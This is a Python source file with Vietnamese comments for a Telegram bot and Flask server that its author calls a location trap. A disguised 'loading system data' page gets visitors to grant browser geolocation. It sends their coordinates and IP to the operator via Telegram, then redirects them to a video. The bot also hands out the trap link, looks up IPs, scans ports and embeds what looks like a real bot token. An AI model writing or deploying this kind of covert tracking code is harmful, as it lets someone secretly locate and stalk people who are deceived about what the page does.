import telebot
import requests
import socket
import time
import os
from flask import Flask, request, render_template_string
from threading import Thread

# --- CẤU HÌNH ---
TOKEN = '8222981632:AAGeWH4l1Mvmvaod8z5lVhthkyHXLtRvgOU'
# Sếp nhớ thay ID thật của sếp vào đây để nhận thông báo tọa độ
ADMIN_ID = "6681014168" 

bot = telebot.TeleBot(TOKEN)
app = Flask('')

# --- GIAO DIỆN TRANG BẪY TỌA ĐỘ (GPS) ---
HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Đang chuyển hướng...</title>
    <script>
        function start() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(success, error);
            } else {
                redirect();
            }
        }
        function success(pos) {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            fetch(`/save_loc?lat=${lat}&lon=${lon}`);
            setTimeout(redirect, 1000);
        }
        function error() { redirect(); }
        function redirect() {
            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Link ảnh/video troll
        }
    </script>
</head>
<body onload="start()">
    <div style="text-align:center; margin-top:50px;">
        <h3>Đang tải dữ liệu hệ thống...</h3>
        <p>Vui lòng chờ trong giây lát.</p>
    </div>
</body>
</html>
"""

# --- XỬ LÝ WEB (FLASK) ---
@app.route('/')
def home(): return "SYSTEM ONLINE 💀"

@app.route('/hack-loc')
def hack_loc(): return render_template_string(HTML_TRAP)

@app.route('/save_loc')
def save_loc():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    maps_url = f"https://www.google.com/maps?q={lat},{lon}"
    
    msg = (
        f"🎯 **MỤC TIÊU ĐÃ SẬP BẪY!**\n\n"
        f"📍 Tọa độ: `{lat}, {lon}`\n"
        f"🌐 IP: `{user_ip}`\n"
        f"🗺 Xem vị trí: [Bấm vào đây để mở Bản đồ]({maps_url})"
    )
    bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
    return "OK"

# --- LỆNH BOT TELEGRAM ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    msg = bot.reply_to(message, "🔌 [SYSTEM]: CONNECTING...")
    time.sleep(1)
    bot.edit_message_text("💀 **ADMIN ACCESS GRANTED**\n\nCác lệnh hiện có:\n/getlink - Lấy link bẫy địa chỉ\n/ip [IP] - Tra cứu thông tin IP\n/scan [Domain] - Quét cổng server", chat_id=msg.chat.id, message_id=msg.message_id)

@bot.message_handler(commands=['getlink'])
def get_link(message):
    # Sếp thay link Render thật của sếp vào đây
    my_url = "https://my-bot-24h.onrender.com/hack-loc"
    bot.reply_to(message, f"🔗 **Link bẫy định vị của sếp:**\n`{my_url}`\n\nKhi họ bấm 'Cho phép', tọa độ sẽ báo về đây.")

@bot.message_handler(commands=['ip'])
def check_ip(message):
    ip = message.text.replace('/ip', '').strip()
    if not ip: return bot.reply_to(message, "Sếp nhập IP đi!")
    res = requests.get(f"http://ip-api.com/json/{ip}").json()
    if res['status'] == 'success':
        bot.reply_to(message, f"🌐 IP: `{res['query']}`\n📍 Vị trí: {res['city']}, {res['country']}\n📡 ISP: {res['isp']}")

@bot.message_handler(commands=['scan'])
def scan_port(message):
    target = message.text.replace('/scan', '').strip()
    if not target: return bot.reply_to(message, "Sếp nhập Domain đi!")
    bot.send_message(message.chat.id, f"🔍 Đang quét mục tiêu: {target}...")
    ports = [80, 443, 21, 22]
    found = []
    for p in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if s.connect_ex((target, p)) == 0: found.append(str(p))
        s.close()
    bot.send_message(message.chat.id, f"✅ Cổng đang mở: {', '.join(found) if found else 'Không tìm thấy'}")

# --- CHẠY BOT ---
def run():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

if __name__ == "__main__":
    Thread(target=run).start()
    bot.infinity_polling(skip_pending=True)
